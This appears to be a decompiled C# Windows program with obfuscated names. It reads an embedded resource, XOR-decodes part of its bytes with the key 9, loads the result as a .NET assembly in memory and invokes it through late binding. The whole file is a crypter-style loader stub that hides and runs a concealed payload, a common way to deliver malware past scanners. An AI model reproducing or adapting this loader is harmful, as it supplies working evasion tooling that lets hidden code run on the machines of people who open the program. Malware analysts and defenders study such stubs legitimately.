using System;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class TobtaRSW_ierwuJPKcV7
{
	[STAThread]
	public static void Main()
	{
		//IL_0130: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			object objectValue = RuntimeHelpers.GetObjectValue(new ResourceManager("gTYwrdP", Assembly.GetCallingAssembly()).GetObject("gTYwrdP"));
			int num = 0;
			do
			{
				NewLateBinding.LateIndexSet(objectValue, new object[2]
				{
					num,
					Operators.XorObject(NewLateBinding.LateIndexGet(objectValue, new object[1] { num }, (string[])null), (object)9)
				}, (string[])null);
				num += 8;
				num++;
			}
			while (num <= 267263);
			Type typeFromHandle = typeof(Assembly);
			object[] array = new object[1] { RuntimeHelpers.GetObjectValue(objectValue) };
			object[] array2 = array;
			bool[] array3 = new bool[1] { true };
			object obj = NewLateBinding.LateGet((object)null, typeFromHandle, "Load", array2, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				objectValue = RuntimeHelpers.GetObjectValue(array[0]);
			}
			NewLateBinding.LateCall(NewLateBinding.LateGet(obj, (Type)null, "GetTypes", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "InvokeMember", new object[5]
			{
				string.Empty,
				256,
				null,
				null,
				null
			}, (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}
}
